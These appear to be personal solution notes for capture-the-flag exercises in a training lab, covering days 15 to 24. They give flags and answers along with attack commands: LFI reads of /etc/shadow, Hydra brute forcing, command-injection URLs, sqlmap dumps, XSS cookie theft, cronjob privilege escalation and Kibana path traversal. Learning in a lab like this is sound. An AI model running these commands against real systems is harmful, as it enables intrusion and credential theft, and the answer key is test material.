# MACHINE : Advent of Cyber


***Day 15***
```
LFI
#1 What is Charlie going to book a holiday to?
: Hawaii

#2 Read /etc/shadow and crack Charilies Password.
: password1
: method
: hashcat,vulner_function

#3 What is flag1.txt?
: read the flag
```

***Day 16***
```
#1 How many files did you extract
: find . -type f | wc -l

#2 How many files contains Version:1.1 in their metadata?
: script : showingTheMetaData.py

#3 Which file contains the password?
: script : readThepassword.py

```

***Day 17***
```
#1 Use Hydra to bruteforce molly's password web password. what is flag 1?
: @Method
: path to /home/ubuntu/hydra-challenge

#2 Use Hydra to bruteforce molly's password SSH password. what is flag 2? 
: @Method
: hydra -l molly -P {password_path} {ip} -t 10 {ssh} -V
```


***Day 18***
```
ELF JS
#1 What is the admin's authid cookie value?
: 2564799a4e6689972f6d9e1c7b406f87065cbf65
: @Method
: Cross Site Script (aka. XSS )
: Redirect Cookie value to SimpleServer
: After Admin cookie Received

```


***Day 19***
```
Commands
#1 What are the contents of user.txt file?
: @Method
: http://10.10.71.172:3000/api/cmd/ls%20%2fhome
: http://10.10.71.172:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt

```

***Day 20***
```
Cronjob Privilege Escalation

#1 What port is SSH running on?
: Reference /Day20/Day20Scanning.txt

#2 Crack sam's password and read flag1.txt
: Reference /Day20/Day20Hydra.txt

#3  Escalte your privileges by taking advantage of a cronjob running every minute. what is flag2?
: /home/scripts/clean_up.sh
: -> cat /home/ubuntu/falg2.txt > /tmp/flag2.txt
: cat /tmp/flag2.txt 
```

***Day 21***
```
Reverse Elf-innering
#1 What is the value of local_ch when its corresponding movl instruction is called

#2 what is teh value of eax when the imull instruction is called?

#3 what is the value of local_4h before eax is set to 0?

Tool Refer : Cutter and gdb

```

***Day 22***
```
Reverse Elf-innering
#1 What is the value of local_8h before the end if the main function?

#2 what is the value of local_4h before the end of the main function?

Tool Refer : Cutter and gdb

```

***Day 23***
```
LapAnd (SQL INJECTION)
#1 Which field is SQL injectable? Use the input name used in the HTML Code.
: log_email
#2 What is Santa Claus' email address?
:sqlmap -u {ip} --forms --crawl=2

#3 What is Santa Claus' plaintext password?
:sqlmap -u {ip} --forms --crawl=2 -D
:sqlmap -u {ip} --forms --crawl=2 -D {DataBaseName} --tables
:sqlmap -u {ip} --forms --crawl=2 -D {DataBaseName} -T {table_name} --dump

#4 Santa has a secret! Which station is he meeting Mrs Mistletoe in?
:waterloo

#5 Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/
:allow file extensions ".phtml"
```


***Day 24***
```
ELK
#1 Find the password in the database
: http://10.10.116.208:9200/_search?q=password

#2 Read the contents of the /root.txt file
: 10.10.116.208:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
: curl http://10.10.116.208:8000/kibana-log.txt | tail -n 1     

```

